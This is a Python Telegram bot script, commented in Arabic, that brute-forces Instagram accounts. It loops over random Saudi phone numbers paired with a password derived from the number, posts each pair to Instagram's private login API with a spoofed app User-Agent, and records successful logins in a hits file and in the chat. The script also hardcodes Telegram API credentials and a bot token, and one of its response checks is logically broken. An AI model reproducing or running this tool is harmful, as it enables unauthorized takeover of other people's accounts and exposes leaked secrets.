from pyrogram import Client, filters
import pyfiglet
import random
import string
import requests
from uuid import uuid4

# = = = = = = = = = = = =
Z = '\033[1;31m' # احمر
X = '\033[1;33m' # اصفر
Z1 = '\033[2;31m' # احمر ثاني
F = '\033[2;32m' # اخضر
A = '\033[2;34m' # ازرق
C = '\033[2;35m' # وردي
B = '\033[2;36m' # سمائي
Y = '\033[1;34m' # ازرق فاتح
# = = = = = = = = = = = =

# تكوين البوت
api_id = "15102119"
api_hash = "3dfdcee3e3bedad4738f81287268180f"
bot_token = "6330663333:AAELQogdDRieaqIURzxn0K4dIkDVFVClaMs"

app = Client("my_account", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

# صفحة التسجيل في التيليجرام
REGISTER_TELEGRAM_PAGE = "https://t.me/YOUR_BOT_USERNAME?start=register"

@Client.on_message(filters.private & filters.command(["start", "help"]))
async def start(bot, message):
    l = pyfiglet.figlet_format('N O T   F X')
    banner = X + l + Z
    await message.reply_text(banner + "\nأهلاً بك! اضغط على الزر لبدء عملية التخمين.")

@Client.on_message(filters.private & filters.command("register"))
async def register(bot, message):
    await message.reply_text(f"قم بالتسجيل عبر الرابط التالي:\n\n{REGISTER_TELEGRAM_PAGE}")

@Client.on_message(filters.private & filters.command("تخمين"))
async def start_guessing(bot, message):
    kl = '1'
    make = '0123456789'
    h, b, s, block = 0, 0, 0, 0
    while True:
        us = ''.join(random.choice(make) for i in range(7))
        user = '+96650' + us
        pasw = '050' + us

        req = requests.session()
        log_head = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            'Accept': "*/*",
            'Cookie': 'missing',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)

        if "logged_in_user" in r.text:
            await message.reply_text(f"تم العثور على حساب ناجح!\n\nUser: {user}\nPass: {pasw}")
            open("Hits.txt", "a").write(f"{user}:{pasw}\n")
            h += 1
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in r.text:
            b += 1
        elif 'challenge_required' or 'two' in r.text:
            s += 1
        elif 'Please wait a few minutes' in r.text:
            block += 1
        elif 'Bad request' in r.text:
            b += 1
        else:
            b += 1

        await bot.send_message(
            message.chat.id,
            f"نتائج البحث:\n\nHit: {h}\nBad: {b}\nScure: {s}\nBlock: {block}"
        )

app.run()
